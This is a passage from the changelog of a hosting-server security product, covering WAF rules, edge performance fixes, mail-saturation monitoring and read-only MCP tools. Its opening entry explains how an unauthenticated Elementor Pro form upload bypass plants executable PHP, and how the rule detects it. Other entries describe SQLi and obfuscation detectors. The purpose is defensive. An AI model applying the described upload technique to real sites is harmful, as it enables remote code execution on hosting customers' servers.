  `continue`s past it and still moves the next part. A two-part upload (empty
  first part, then a `.php` payload) thus lands executable PHP in the public
  `wp-content/uploads/elementor/forms/` directory, unauthenticated. The detector
  keys on `POST admin-ajax.php` + the nopriv action `elementor_pro_forms_send_form`
  + a php-executable upload filename, reusing the hardened rule-401 detector; it
  runs before the generic upload rules so the hit is attributed as
  `WAF/CVE-2026-32475` (6h nft ban + Slack/mail). The surviving file *extension*
  is the vuln, so the rule keys on that exact shape (a content-bytes leg is
  intentionally omitted — raw php content is already covered fleet-wide by the
  armed generic rule 402). Near-zero FP — a legitimate Elementor form upload never
  carries a php-executable file.
  **Note:** the generic upload-filename rule (401, block + armed) already blocked
  the straightforward `.php` upload fleet-wide; this rule adds CVE attribution and
  covers the body-budget-evasion / uncommon-extension edges. Updating Elementor
  Pro to ≥ 4.2.2 remains the actual fix. (Rule id 10015 is intentionally skipped —
  the removed vBulletin runMaths rule.)

### Changed
- **Decision breaker: observable OPEN/CLOSED logging.** The edge decision-RPC
  circuit breaker was silent (it just failed fast). It now emits a **throttled**
  `ngx.log(WARN)` line to the edge `error.log` on each transition — `[cfm]
  decision breaker OPEN — cfm daemon unreachable …` when it trips and `[cfm]
  decision breaker CLOSED — cfm daemon reachable again …` on recovery — so an
  operator can watch it engage via the MCP **`edge_error_tail`** tool
  (`grep "decision breaker"`). Each line type has its own **independent 60 s
  throttle**, so at most one OPEN and one CLOSED per window even under a
  persistent hang (re-trips ~once per cooldown) or a flapping daemon. No verdict
  or timing change — logging only. Covered by an added case in
  `cfm_decision_breaker_test.lua`.
- **Edge TLS: `ssl_buffer_size 4k` (was the 16k default) for lower TTFB.** Both
  `openresty.conf` and `angie.conf` left `ssl_buffer_size` at nginx's 16k
  default, so the first TLS record of a response could be held until up to 16 KB
  fills/flushes — adding a round-trip to time-to-first-byte for small first
  responses (redirects, API JSON, the challenge page) over high-RTT (distant /
  mobile) links. 4k emits the first bytes in a smaller record so they arrive ~1
  RTT sooner. The only cost is marginally more TLS framing overhead on large
  downloads (≈0.75 % on a 1 MB transfer — negligible for this redirect/API/
  challenge-heavy edge; big media still streams). Standard nginx TTFB tuning,
  instantly reversible, no behaviour change beyond record sizing. Found by the
  2026-07 edge audit.
- **Edge decision RPC: circuit breaker for a hung/down cfm daemon.** When the
  daemon is HUNG (accepts the unix connection but never replies), every uncached
  request paid the full `decision_timeout_ms` (~300 ms) before failing open — a
  hung daemon became a fleet-wide latency cliff. `cfm_decision.lua` now trips a
  shdict-gated breaker after an **unbroken run of 3 `timeout`/`connect`
  failures** and **skips the decision RPC for 3 s**, so cache-miss requests fail
  fast per policy instead of stacking 300 ms waits. It self-heals: once the
  cooldown lapses requests probe — a success clears the breaker, and a persistent
  hang simply re-accumulates a fresh 3-run (a few slow probes per cooldown). The
  **verdict is unchanged** — a hung/down daemon already failed open (or closed,
  under `fail_open=0`); the breaker only removes the latency, and the WAF still
  runs uncached on every request while existing nft autoblock bans stay
  kernel-level. Hardened across five adversarial review rounds: the count is
  **consecutive** (any decision success resets it), so a busy healthy node with
  occasional timeouts never spuriously trips; **only the `decision` kind is
  gated** — the best-effort telemetry RPCs (`observe`/`ip_push`/`ok_touch`/
  `waf_stats`/`waf_excludes`) can neither trip the breaker nor clear it nor be
  silenced by it (an autoblock push a healthy daemon can still serve is never
  dropped by a decision-only trip); only `timeout`/`connect` count (an
  `http_4xx/5xx`/json error means the daemon responded); a **partial-reply hang**
  (200 + Content-Length, then hang mid-body) now returns a real body-timeout
  error instead of a `(nil,nil)` that read as success; there is **no request-
  scoped state** on the client across the socket yield, **no single-flight probe
  lock** (it deadlocked the token-rotation retry), and **no presence-based
  re-arm** (it let a lone stray timeout re-open on one blip) — so a recovered
  daemon's isolated timeout can never re-trip. Accepted trade-off (inherent to
  any breaker): a recovered daemon is not consulted for up to the 3 s cooldown —
  kept short for that reason. State lives in the shared `cfm_decisions` dict
  (node-wide across workers; the 2 tiny hot keys add no eviction pressure). New
  `scripts/tests/cfm_decision_breaker_test.lua`. Found by the 2026-07 edge audit.
- **Edge access logging: drop a dead map + document the panel double-write.**
  Removed the **dead `$log_main_request_nonpanel` map** (defined in both
  `openresty.conf` and `angie.conf`, never referenced — CLAUDE.md §5). It was an
  abandoned attempt to stop writing panel requests to `access.log`; activating it
  would have been a regression, because `internal/edgelog` (the on-demand MCP
  forensic tools `edge_access_tail` / `ip_forensics`) reads
  `access.log`/`access.cfm.log` but **not** `access-panel.log` — so splitting
  panel traffic out of `access.log` would have silently hidden it from those
  tools. The panel double-write is therefore deliberate and is now documented as
  such at the `access_log` lines. Also documented **why `access.log` is left
  unbuffered** (a `buffer=`/`flush=` that the audit first proposed): it would
  break the rotation policy (`configs/logrotate-cfm` uses `copytruncate` with no
  reopen signal → a lost in-memory window and a sparse file) and would blind the
  live forensic tools to the most recent traffic; the per-request `write()` lands
  in the OS page cache and is cheap regardless. Found by the 2026-07 edge audit.
- **cfm.lua hot path: hoist the request-invariant CFG out of the per-request
  chunk + skip a query-string parse.** `cfm.lua` is an `access_by_lua_file`, so
  its whole body re-executes on every request. The inline `CFG` literal re-ran
  **~21 `os.getenv()` reads** plus a couple of temp-table and closure allocations
  per request, all for process-lifetime-constant values — and in fact none of
  those `CFM_*` knobs is ever set (the systemd units export none, and nginx
  strips env vars not declared with `env NAME;` — only 6 are declared, none set),
  so `os.getenv()` always returns nil and the defaults always win. Those static
  fields now live in a new `cfm_cfg.lua` built **once per worker** (via
  `require`'s `package.loaded` cache); cfm.lua layers the four bridge-derived
  fields (`token`, `ok_ttl_sec`, `clearance_refresh`, `origin_keepalive` — which
  refresh on the bridge file's 10s TTL and must stay dynamic) onto it through a
  metatable `__index`, so every `CFG.<field>` read and cfm_decision's in-place
  `cfg.token` rotation are unchanged. Behaviour is byte-identical (env is
  worker-constant); covered by `scripts/tests/cfm_cfg_test.lua`. Separately,
  `try_apply_post_resume` now gates on the single-arg `ngx.var.arg_cfm_rt` before
  calling `ngx.req.get_uri_args()`, skipping a full query-string parse + table
  alloc on the overwhelming majority of GETs (which carry no `cfm_rt`). Found by
  the 2026-07 edge Lua audit.
- **Edge workers: 4 → 6 workers + raise the connection/FD ceiling.** Both
  `openresty.conf` and `angie.conf` hardcoded `worker_processes 4` and
  `worker_connections 1024`. Now that ALL traffic is in-path (TLS termination +
  Lua WAF/challenge are CPU-bound), 4×1024 connections — each proxied request
  burning 2 (client + upstream) — throttled a busy edge under load. Bumped to
  `worker_processes 6` (a deliberate fixed count, NOT `auto`: the edge is a
  reverse proxy co-located with the origin web server — LiteSpeed/Apache, itself
  ~2 workers — and MySQL, so it must not grab every core; `auto` counts host
  cores, ignores cgroup CPU quotas, and would starve the co-located origin on a
  high-core box), `worker_connections 16384`, and added `worker_rlimit_nofile
  65535` so workers have the FDs to back the higher cap. This raises the
  connection ceiling and never lowers it, and nginx/angie never refuse to start
  over it — but the higher cap only pays off if the FD limit keeps up (with a low
  `LimitNOFILE` a worker hits EMFILE under heavy load instead of a clean limit),
  and it preallocates ~8 MB/worker of connection slots at startup (~48 MB across
  6). **Operator note:** CFM doesn't manage the openresty/angie systemd unit — if
  error.log shows `setrlimit(RLIMIT_NOFILE) failed` or `worker_connections exceed
  open file resource limit`, raise `LimitNOFILE` in that unit. Found by the
  2026-07 edge audit.
- **Panel listeners: revive the keepalive pool to the challenge service.** The
  DNAT cPanel/WHM panel listeners (`cfm-panel-listeners.conf.in`) proxy their
  internal `/__cfm_panel_decide`, `/__cfm_challenge` and `/__cfm_verify` hops to
  the static `cfm_challenge` upstream (127.0.0.1:9098, `keepalive 8`), but all
  21 of those locations were missing `proxy_http_version 1.1` + `Connection ""`,
  so nginx closed the connection after each one — every panel challenge
  decision/verify opened a fresh TCP connection to the challenge daemon. Added
  the same idiom the web edge already uses on its `/__cfm_challenge` hop, so the
  pool is actually used. Pure plumbing, no behaviour/security change. (The main
  `location /` + acctxfer hops proxy to the `$cfm_pass` **variable**, which
  nginx keepalive pools can't use, so they're unchanged — pooling the panel
  origin itself would need a static upstream and is a separate, larger change.)
  Found by the 2026-07 edge audit.
- **Edge log ingest: batch the per-request socket send (fewer timers &
  syscalls).** `log-cfm.lua` (`log_by_lua`) previously armed one
  `ngx.timer.at` + one Unix-socket connect/send **per request** — at 1000 rps
  that is 1000 timers/s/worker, brushing nginx's `too many pending timers`
  ceiling. It now buffers TSV lines per worker and a **single** timer drains
  the whole buffer after at most 100 ms, or immediately once 64 lines
  accumulate or 256 KB is buffered (hard caps 4096 lines / 8 MB → drop-to-bound-
  memory if timers can't be scheduled at all, same best-effort loss class as the
  old per-line drop; byte caps because URI/UA are attacker-influenced). The
  ≤100 ms tail is dropped on worker shutdown (cosockets are disabled in a
  premature timer), the same best-effort class as before. The receiver
  already reads newline-delimited records in a loop
  (`ingest_socket.go` `serveConn` → `handleLine` per `\n`), so a concatenated
  batch parses as individual records with **no Go change**; batching also means
  FEWER concurrent connections (kinder to the ingest connection cap). Record
  bytes are unchanged; only delivery is batched, adding ≤100 ms of log latency
  (negligible for the detector's seconds-to-minutes behavioural windows). New
  `scripts/tests/cfm_log_batching_test.lua` covers single-drain, the 64-line
  eager flush, snapshot-before-yield (no double-send/loss), and the cap.
- **WAF: literal prefilters on two hot in-path detectors (CPU, no behaviour
  change).** Two detectors that run on ordinary request surfaces did expensive
  Lua *pattern* work before deciding they had nothing to match. Each now begins
  with a cheap necessary-substring gate that provably cannot change any result:
  - **rule 319 `WAF_SQLI_UNION_VARIANT`** — every target is `union<mid>select`,
    so `union` must be present; a single `string.find(scw,"union",1,true)` now
    guards the six mid-variants (24 unanchored pattern scans). On a clean
    digit/paren-heavy query this detector dropped from ~25 µs to ~35 ns/call in a
    LuaJIT microbench (the pattern engine backtracks hard on `[%d'"%)] ?union…`
    over digits); it was the single most expensive SQLi detector on clean GETs.
  - **`has_phpfuck_blob`** (feeds rule 405 script-obfuscation and rule 439
    numeric-XOR) — a hit needs a run of ≥`min_caret` (≥1) `^` chars, so when the
    body has no `^` at all the `gmatch` over every `[0-9().^]` run is skipped
    (JSON-number-heavy bodies produce many runs). Guarded on `min_caret>=1` so it
    stays correct for any caller.
  Both gates are behaviour-identical (a battery parity check + the existing
  rule-319/rule-439 TP/FP suites pass unchanged; a no-`union` and a no-caret
  fast-path case were added). Found by the 2026-07 edge Lua audit; first of the
  ranked prefilter items.
_Nothing yet._

## 2026.08.20

### Fixed
- **kernsec: reconcile a leftover `fs.protected_regular=2` in foreign sysctl
  drop-ins.** kernsec pins `fs.protected_regular=1` (value 2 breaks cPanel's DNS
  Zone Editor) in `99-cfm-kernsec.conf`, but a stale `=2` in a foreign drop-in
  that sorts *after* it — notably the legacy `/etc/sysctl.d/99-kspp.conf` the old
  `scripts/kspp.sh` shipped — was re-applied on the next reboot / `sysctl
  --system` and silently re-broke the Zone Editor, even though the live value was
  correct right after apply. `cfm kernsec apply` now scans the other
  `/etc/sysctl.d/*.conf` files (plus the legacy `/etc/sysctl.conf`) for an active
  `fs.protected_regular` set to anything other than kernsec's value and comments
  it out (backing the file up once to `<file>.cfm-kernsec.bak`, preserving mode),
  so the value settles everywhere. The pending conflict now also counts as drift,
  so `apply --check` / `cfm kernsec monitor` flag the latent revert until an apply
  defuses it. The interactive apply confirm prompt and `cfm kernsec preview` both
  now name the foreign file(s) about to be rewritten and their `.cfm-kernsec.bak`
  backups, so the operator never confirms blind to a mutation of a file kernsec
  doesn't own. Narrow, curated allowlist (`foreignReconcileKeys`) — not a blanket
  operator-sysctl overwrite; only `/etc` files are touched, vendor dirs
  (`/usr/lib/sysctl.d`, `/run/sysctl.d`) are left alone, and `disable` skips the
  reconcile. Slash-separated keys (`fs/protected_regular`, which sysctl.conf(5)
  treats as equivalent) are matched too. The legacy `scripts/kspp.sh` now also
  writes `fs.protected_regular=1` so it can no longer re-introduce the trap.
- **logrotate: cover the legacy flat `/var/log/cfm.api.log` fallback.** The
  primary `/var/log/cfm/cfm.api.log` was already rotated by the directory glob,
  but the flat fallback path `cfmlog.go` can write to had no rotation entry, so
  `check_logrotate_coverage` flagged it. Added it to the legacy top-level stanza
  in `configs/logrotate-cfm`.

### Added
- **mailruntime: 1a-sig collector v1 — mail_runtime now carries log-driven
  saturation counts.** `GET /api/v1/mail/runtime` (and the `mail_runtime` MCP
  tool) gains a `signals` block: a bounded tail of the Exim mainlog (20k lines)
  tallied into `spamd_error` and `inbound_conn_refused` counts over the observed
  `window_seconds`, plus `lines_scanned`/`log_file`. This is the log-driven half
  of the geometry — spamd read-timeouts and inbound-cap rejections the
  instantaneous current/max gauge can't see. **Burn-in only:** the counts are
  exposed so their real fleet rates can be observed; no `whats_wrong` finding
  fires on them yet. A missing/empty mainlog yields a zeroed block; a FAILED tail
  (unreadable/rotated) is surfaced in `signals.error` rather than a false-healthy
  zero (unknown never reads as OK). The block also carries `window_known` (false
  when <2 distinct timestamps were parsed, so `window_seconds` is 0 even with
  non-zero counts) — a future rate consumer gates on it to avoid dividing by
  zero. The geometry snapshot always stands on its own regardless. New
  `internal/mailruntime/counts.go` (pure classify+count) and
  `internal/maillog.ScanTail` (uncapped streaming tail for counting callers).
### Fixed
- **maillog: a failed `tail` no longer masquerades as a clean empty read.**
  `internal/maillog`'s bounded tailer swallowed the `tail` child's exit status,
  so an unreadable/rotated log returned an empty result with no error — fine for
  a display tail, but the new saturation collector would read that zero as
  "healthy". It now surfaces a non-zero `tail` exit as an error (the timeout and
  read-error paths keep priority), which the `mail_runtime` endpoint reports in
  `signals.error`. Affects `mail_log_tail` too: an unreadable mail log now errors
  instead of returning empty.
- **mailruntime: log-signature classifier (PR 1a-sig).** New `sig.go` pure
  classifier for the three mail saturation log signatures, grounded in verbatim
  fleet log lines (six cPanel nodes): `SigSpamdError` (Exim spam ACL "error
  reading from spamd … Connection timed out" / "cannot parse spamd … output" —
  the smoking gun of spamd saturation), `SigInboundConnRefused` (this box's Exim
  refusing an inbound connection at `smtp_accept_max`: matched on BOTH
  "Connection from […]" and "refused: too many connections" — anchored to the
  daemon's own line shape so a *remote* MX's 421 "Too many concurrent SMTP
  connections" (deliverability, echoed verbatim into the mainlog) can never be
  misread as our saturation), and `SigSpamdChildKilled` (spamd prefork "killing failed child",
  ignoring routine state/adjust chatter). Pure/no-I/O; a later collector will
  count these over a window to enrich the mail_runtime geometry.
- **whats_wrong: SMTP/spamd runtime saturation (PR 1c — the mail_runtime blind
  spot lands in triage).** `whats_wrong` now pulls `/api/v1/mail/runtime` and
  raises a `mail` finding when the inbound SMTP connection pool or the spamd
  scanner-children pool is saturating: `warn` (≥80% of the cap) → a warning,
  `critical` (≥95% / at the cap) → a critical, each pointing at the `mail_runtime`
  drill-down. This catches the "every mail daemon is up, queue looks fine, but
  submission (587) is unavailable because spamd is saturated and SMTP sessions
  hit smtp_accept_max" case that health/queue signals miss
  (docs/whats-wrong-rootcause.md §5a). Conservative by design: an `ok` or
  `unknown` pool (cap unresolved) raises nothing — unknown is not a problem and
  is not surfaced as one.
- **`mail_runtime` MCP tool + `GET /api/v1/mail/runtime` (PR 1b-iii).** Exposes
  the SMTP/spamd saturation snapshot as a read-only, host-level, admin-only
  endpoint and MCP tool: current inbound SMTP sessions vs `smtp_accept_max` and
  active spamd children vs `--max-children`, each as current/max → utilisation%
  → an `ok`/`warn`/`critical` class (rendered as a label), plus the worst of the
  two and the resolved exim.conf path. A cap that can't be read from config shows
  `unknown`, never a false `ok`. This is the "mail is up but wedged" signal the
  queue summary can't see (spamd saturated → SMTP sessions pile up → Exim hits
  its connection cap → 587 unavailable). Standalone read tool; the `what's_wrong`
  finding that gates on it is the next step.
- **mailruntime: config discovery for the saturation maxima (PR 1b-ii).**
  `DiscoverEximMaxima` reads `smtp_accept_max` from the first standard Exim config
  that explicitly sets it (`/etc/exim.conf`, `.local`, DA/exim4 layouts), and
  `DiscoverSpamdMaxChildren` reads `--max-children` from the master spamd
  process's command line (`/proc`) — matched by CMDLINE, since on cPanel the
  master runs under perl (COMM `perl`, not `spamd`; only the workers rewrite
  their name to `spamd child`), so a COMM match would miss it fleet-wide.
  Deliberately does NOT assume the built-in defaults (Exim 20 /
  spamd 5) when a value isn't explicitly configured — a cPanel box routinely
  raises them, so an un-found cap stays `unknown` (→ SatUnknown) rather than
  risk a false 100% saturation. Both parameterized over their path/`/proc` root
  for unit tests.
- **mailruntime: current-count sources + snapshot assembler (PR 1b of the
  `mail_runtime` subsystem).** Adds the live-gauge half of the SMTP/spamd
  saturation picture, exec-free: inbound SMTP session count from ESTABLISHED
  sockets on the listener ports (25/465/587) via `/proc/net/tcp{,6}` (local-port
  keyed, so outbound deliveries don't count; mirrors the health detector's
  reader), and active spamd children by counting the `spamd child` process COMM
  (grounded in `configs/lsm.conf`). A pure `buildSnapshot` assembler turns those
  counts + the parsed maxima into per-resource `Utilisation`/saturation with a
  visible `Worst` (an unresolved or unlimited cap stays `unknown`, never `ok`).
  Still read-only and not yet wired to an endpoint/`what's_wrong`; config
  discovery (locating exim.conf / the spamd command line) and the MCP surface
  come next, and the log-signature parsers await real captured lines.
- **mailruntime: pure geometry leaf (PR 1a of the `mail_runtime` subsystem).**
  New `internal/mailruntime` package supplying the SMTP/spamd *saturation*
  geometry the queue-centric mail summary can't see — a server up-but-wedged
  (spamd saturated → SMTP sessions pile up → Exim hits its connection cap → 587
  unavailable). Ships the effective-geometry math (`Utilisation` current-vs-max
  → utilisation% → an under-flagging saturation class, mirroring the MySQL
  governor's connection-pressure shape) and the config-maxima parsers (Exim
  `smtp_accept_max`/`_per_host`, spamd `--max-children`/`-m`). Pure/no-I/O, with
  `unknown` first-class (an unresolved cap never reads as `ok`, per
  `docs/whats-wrong-rootcause.md` §3). Not yet wired to any collector or
  `what's_wrong` finding; the log-signature parsers land in a follow-up once
  real captured lines are in hand.
- **procbaseline: `Store.FamilyStats` descriptive family statistics** — count,
  coverage, present-samples, median, p95 (nearest-rank) and max for one COMM
  family over an explicit history window. Purely descriptive: it carries no
  anomaly verdict or minimum-history policy, so a later rule layer can inspect
  Samples/Coverage before deciding the history is sufficient. (Changelog entry
  back-filled for #1283, which merged while CI was not enforcing the hygiene
  gate.)

### Changed
- **Edge unification Phase 3 — panel cookie-net cleanup.** Dropped two nets from
  the panel guard (`configs/lua/cfm_panel.lua`) now that the per-scope clearance
  cookie scheme has proven itself fleet-wide (burn-in clean on the two enforce
  nodes: zero panel loop-breaker fires and zero would-block/ip-block residue in a
  window entirely after the enforce flip):
  - the **legacy shared-cookie-name (`cfm_clearance`) fallback** in
    `read_clearance_cookie` — the panel now reads only the per-scope
    `cfm_clearance_p<port>` cookie the challenge server mints. Worst case for a
    stale legacy-name cookie is a one-time re-challenge, never a lockout.
  - the **panel challenge loop-breaker** (the `prior_attempts >= 3` circuit
    breaker and its per-IP attempt counter). The `validator_degraded` fail-open
    (broken HMAC/validator module) is retained — it is a distinct safety net —
    and the blanket human-entry challenge itself is unchanged (kept by design as
    the edge bot-shield).

## 2026.08.13

### Changed
- **The read-only MCP server is now DEFAULT-ON.** With `AUTH_TOKEN` set (and no
  explicit `MCP = off`), `/mcp` arms automatically. If no `MCP_TOKEN` is
  configured the daemon **auto-generates a strong, distinct one** and persists it
  at `/var/lib/cfm/mcp_token` (`0600 root:root`, daemon-only). This lets the
  fleet gateway (cfm-web) reach every node's `/mcp` with the `AUTH_TOKEN` it
  already holds — **no per-node `MCP_TOKEN` to hand-distribute across ~20
  servers** — while a distinct generated token keeps "an MCP leak is not an admin
  leak". Set `MCP_TOKEN` explicitly only to pin a value (still must be ≥ 24
  chars; a weak explicit token stays disabled and is never silently replaced).
  New `MCP` / `MCP_ENABLED` config key is a per-node kill switch (`MCP = off`);
  unset/`on` = armed. Previously the server mounted **only** when a strong
  `MCP_TOKEN` was set by hand, so all but the two burn-in nodes were unreachable.

### Security
- Auto-generated `MCP_TOKEN` is written `0600 root:root` (not the `0640 root:cfm`
  of edge-consumed Lua tokens): it is a daemon-only secret — the gateway
  authenticates with `AUTH_TOKEN`, and nothing else reads it.

### Changed
- **The `/mcp` static-bearer gate now also accepts the admin `AUTH_TOKEN`, not
  just `MCP_TOKEN`.** A fleet gateway (the Laravel cfm-web) already stores each
  node's `AUTH_TOKEN` to reach `/api/v1`; accepting it at `/mcp` lets that gateway
  speak MCP to every node **without a second, separately-managed `MCP_TOKEN`** in
  its agents table. The security boundary is unchanged: `MCP_TOKEN` still cannot
  touch `/api/v1`, the `/mcp` tool surface is read-only regardless of which token
  authenticated, and an `AUTH_TOKEN` holder can already do everything via
  `/api/v1` — so exposing the read-only subset to it adds no privilege. The OAuth
  consent flow stays `MCP_TOKEN`-only (`AUTH_TOKEN` is never browser-pasted), and
  arming is unchanged — a node still needs a strong `MCP_TOKEN` set to mount
  `/mcp` at all, so no node gains an MCP endpoint it didn't already have.

## 2026.08.12

### Changed
- **Mail queue admin page: "Top sender domains" and "Top recipient domains" now
  sit side-by-side.** They are both half-width cards but were separated by the
  full-width "Who filled the queue" table, so each rendered alone on its row.
  Reordered so the two Top-domains cards are adjacent (one grid row, side-by-side;
  they still stack on narrow screens), with "Who filled the queue" below them.
  Pure layout reorder — no data or behaviour change.

### Added
- **LVE per-tenant CPU now shows the account username, not just the uid.**
  `lve_cpu` / `GET /api/v1/system/lve-cpu`, the `cfm lve` CLI, and the Health UI
  table gain a resolved `username` per tenant — on cPanel/DirectAdmin the Linux
  user IS the hosting account, so a hot LVE now says WHO to look at instead of a
  bare numeric uid. Resolution is at the API layer (the pure `lvestat` leaf stays
  side-effect-free), bounded and cached (5-min TTL over both hits and misses, so
  repeated ~15s polls don't re-read `/etc/passwd` per row while a new account
  still appears within the window). The default/aggregate LVE uid `4294967295` is
  labelled `(default LVE / outside)` rather than looked up; a uid with no passwd
  entry shows blank (the bare uid still displays).
- **MCP `waf_rule_detail` — one WAF rule across both surfaces.** New read-only,
  admin-only MCP tool that deep-dives a single WAF rule / reason-family across
  BOTH enforcement surfaces at once — the in-path web edge and the panel
  (cPanel/WHM) edge — now that the panel runs the same `cfm_waf` ruleset. Give a
  reason family or substring (`WAF_SQLI`, `WAF_RCE:EVAL`, `sqli`) or a numeric rule
  id (`320`, `10001`; resolved to its family for the web side, since web WAF events
  key on the reason string, not the panel log's numeric id). Returns the matched
  registry rules (id / family / built-in default_mode), the WEB slice (events,
  blocked, unique ips+hosts, top exact-reasons/ips/hosts/countries over `hours`),
  and the PANEL slice (hits, scanner vs non-scanner split, `nonscanner_would_block`,
  matched rule ids, sample non-scanner requests). Answers "is rule X safe to
  enforce?" and surfaces a rule clean on the web but firing on the panel from real
  browsers (an FP) — the burn-in companion to the aggregate `waf_activity` (web)
  and `waf_fp_hunt` (panel). Composes three existing read-only endpoints
  (`waf/rules` + `waf/engine/summary` + `system/waf-fp-hunt`); no new endpoint.
- **MCP `nft_counters` — nftables named-counter view.** New read-only, admin-only
  MCP tool + `GET /api/v1/firewall/counters`. Reports how much traffic each L3/L4
  firewall RULE is matching in `table inet cfm`, grouped by family (portflood /
  connlimit / synflood / ppsflood / hardening / smtpblock), busiest-first with
  `by_family` totals — the rule-match volume, distinct from `firewall_blocks`
  (the blocked-IP sets). Answers "which firewall rules are firing, and how hard?";
  a spiking `portflood_*` or `synrate` counter flags an active L3/L4 flood.
  Backend-agnostic: parses the counters out of the existing `ListTableJSON`
  (`nft -j list table`) both engines implement, so there is no new firewall
  backend method and no nftlib netlink object read. Reads on the default exec-nft
  backend; on the nftlib backend (whose `ListTableJSON` emits no counter objects)
  it reports `available:false` rather than a misleading empty list. `nonzero=true`
  hides idle counters. Does NOT reflect panel/web WAF or bridge enforcement (those
  are edge-layer 403 denials, not nftables rules — use `waf_activity` /
  `waf_fp_hunt`).

### Changed
- **`ip_forensics` can now reach rotated logs (opt-in).** `include_rotated=true`
  (MCP) / `?include_rotated=1` also scans the resolved access log's rotated
  siblings — `access.log.1`, `access.log.2.gz`, `access.log-YYYYMMDD.gz`, … —
  newest-first, so per-IP forensics can see evidence from before the last
  logrotate instead of only what's still in the live file. Still bounded: at most
  `max_files` siblings (default 10, max 60), a shared line budget across all of
  them, the same single scan timeout, and gz is streamed (never decompressed
  whole into memory); `Truncated` is set if any bound is hit. Default behaviour is
  unchanged (live file only). The response gains `files_scanned` (live first, then
  the rotated files actually read).
- **`whats_wrong` now includes a panel-enforcement burn-in signal.** The triage
  flagship additionally pulls `waf_fp_hunt` and flags, conservatively (count > 0),
  real **non-scanner** clients a panel WAF BLOCK rule would/did deny
  (`panel_waf.nonscanner_would_block`) or requests the bridge would/did IP-block on
  a panel port (`panel_decision.ip_block_count`) — the customer-facing residue that
  gates whether panel enforcement is safe to arm, and a live false-positive once
  enforcing (Phase 4a/4c). Each finding points at `waf_fp_hunt` to drill in.
  Scanner noise is already excluded upstream, so any residue is real. `sources`
  reports the new `panel_burnin` signal like the rest (read / unavailable / errored).

### Fixed
- **`waf_fp_hunt` no longer under-counts the panel block-tier FP gate on
  enforcing nodes.** After the Phase-4c default-enforce flip, an enforcing panel
  WAF logs `[cfm_panel_waf] enforce=block` (not `logonly=would_block`), but the
  `panelfp` aggregator still keyed its WAF action tally on the `logonly=` field —
  so enforce hits bucketed as `unknown` and were left OUT of
  `nonscanner_would_block` (and the per-rule candidate-FP count). That silently
  masked panel false positives precisely when enforcement was on. `panelfp` now
  derives the action from the `enforce=` marker too and counts an actual block the
  same as a would-block (distinct `enforce_block` label in `by_action` so the
  aggregate still shows which side acted). LOGONLY burn-in nodes are unchanged.

### Fixed
- **`make release` GitHub release failed on a large CHANGELOG (`gh: Argument
  list too long`).** The release notes were passed as a single `gh … --notes`
  argument; when a big `[Unreleased]` backlog is stamped into one day's section
  (e.g. 320 KB), that one argument blows past Linux's 128 KiB per-arg limit and
  `gh release create` dies with exit 126 — so no tag/release is cut (the package
  build, CHANGELOG commit/push, and `make sync` had already succeeded). Now the
  notes go via `--notes-file` (a temp file, cleaned up after), and
  `scripts/release-notes.sh` caps its output (default 100 KB, override with
  `RELEASE_NOTES_MAX_BYTES`) with a "see CHANGELOG.md" footer so it also stays
  under GitHub's ~125 000-char release-body limit. Also fixed a `set -o
  pipefail`/SIGPIPE bug in the first cut of the cap that made an oversized
  section come back empty.

### Added
- **`make release` now auto-commits & pushes `CHANGELOG.md` (only).** After
  stamping the date, `release` commits **just** `CHANGELOG.md` (path-scoped, so
  a release host's built binaries / compiled BPF objects in the working tree are
  never swept in) and pushes the current branch. No more "stamped but forgot to
  commit" — a failed commit/push warns but never aborts an otherwise-good
  release. Standalone `make changelog` still only edits the file.
- **CI `changelog` guard (`scripts/tests/check_changelog_entry.sh`).** New job
  in `security.yml`: (1) asserts `CHANGELOG.md` keeps exactly one, correctly
  placed `## [Unreleased]` heading (the invariant the date-stamper needs — a
  renamed/removed one silently stops `make release` from stamping); (2) on PRs,
  fails when runtime code changed but no `CHANGELOG.md` entry was added. Escape
  hatches for the rare no-op-to-operators change: `[skip changelog]` in the PR
  title/body, or a `no-changelog` label. Docs/tests/CI-only PRs are exempt.
- **MCP logs group — `cfm_log_tail` + `journal_tail`.** Two read-only,
  admin-only MCP tools (+ `GET /api/v1/system/cfm-log` and `/api/v1/system/journal`),
  backed by the new `internal/cfmlog` bounded reader. `cfm_log_tail` tails CFM's
  own `/var/log/cfm/*` logs by curated key (main/error/api/detector/challenges/
  smtp/mysql/waf/clam/socket/lsm/service) — "what did the daemon or a subsystem
  log?" when the edge access/error logs don't explain a symptom; a log that
  isn't present returns `found:false`, not an error. `journal_tail` tails the
  systemd journal for an **allow-listed** unit (cfm + hosting-stack: angie/
  openresty/nginx/httpd/apache2, mysql/mysqld/mariadb, exim, dovecot, postfix,
  sshd, clamd, named) — a service's own start/crash/restart output; an arbitrary
  unit is rejected (the allow-list is the boundary, so an admin read tool can't
  tail any unit on the box) and a non-systemd host returns `available:false`.
  Both are bounded (last-N tail/`journalctl -n` + timeout + capped output + optional
  grep) with no continuous cost.
- **MCP minor status reads — `clam_status`, `notifier_status`, `http3_status`.**
  Three thin read-only, admin-only MCP tools over existing endpoints:
  `clam_status` (ClamAV on-upload scanner health — enabled?, scan scope/mode,
  circuit-breaker open/since/consec-fails, queue len/cap, lifetime counters:
  "is upload scanning running or has clamd tripped the breaker?"),
  `notifier_status` (which alert channels are enabled + delivery runtime state —
  "are CFM's alerts actually going out?"; no secrets returned), and
  `http3_status` (the HTTP/3/QUIC opt-in vhost list). No new endpoints.

### Changed
- **GitHub releases are now tag + CHANGELOG notes only — no `.deb`/`.rpm`
  assets.** `make release` publishes a lightweight release (title + that day's
  CHANGELOG section as the notes, via `scripts/release-notes.sh`) and no longer
  attaches packages. Binaries are distributed via `make sync` to the apt/yum
  repo, so the GitHub assets were redundant; dropping them keeps GitHub storage
  flat across the many date-based releases. (`checksums.txt` is still generated
  for `make sync`.)
- **Edge unification: Phase 2 closed, Phase 3 started.** Panel unification
  (LOGONLY challenge decision + reduced panel WAF + per-scope clearance cookies +
  self-origin parity) has burned in on both engines with a clean false-positive
  gate (`waf_fp_hunt`: zero non-scanner would-blocks, zero bridge IP-bans; the
  only panel-WAF signal is bare-IP scanner probes → would-challenge), and the
  cPanel-plugin iframe cross-port clearance flow was verified live with no loop.
  The former `OPENRESTY_MODE` key is now removed from the reference
  `detectors.conf` (edge mode has been unconditional since Phase 1a; a stale key
  in a live config is still ignored with a one-line deprecation warning). The
  remaining Phase 3 cookie-net cleanup (inert `cfm_ok`, legacy shared-cookie
  fallback, loop-breaker) is deferred to its own change. See
  `docs/edge-unification-plan.md`.
- **Edge unification Phase 4a: panel WAF enforce is now available, opt-in
  (default LOGONLY), BLOCK-tier only.** `CFM_PANEL_WAF` gains an `enforce` value
  alongside `0`/off and the default `1`/logonly. In `enforce`, only the
